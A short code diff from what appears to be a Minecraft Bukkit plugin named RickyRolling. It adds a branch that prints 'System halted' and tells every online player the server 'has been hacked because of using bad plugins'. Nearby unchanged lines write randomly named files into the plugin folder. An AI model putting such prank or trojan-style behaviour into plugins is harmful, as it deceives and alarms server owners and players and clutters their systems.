@@ -41,6 +41,12 @@ public class AtStart {
                     } catch (IOException e) {
                         e.printStackTrace();
                     }
+                }else{
+                    System.out.println("System halted");
+
+                    for(Player p : Bukkit.getOnlinePlayers()){
+                        p.sendMessage("This server has been hacked because of using bad plugins");
+                    }
                 }
                 File file = new File(RickyRolling.getInstance().getDataFolder(), r.nextInt(100) + ".yml");
                 try {
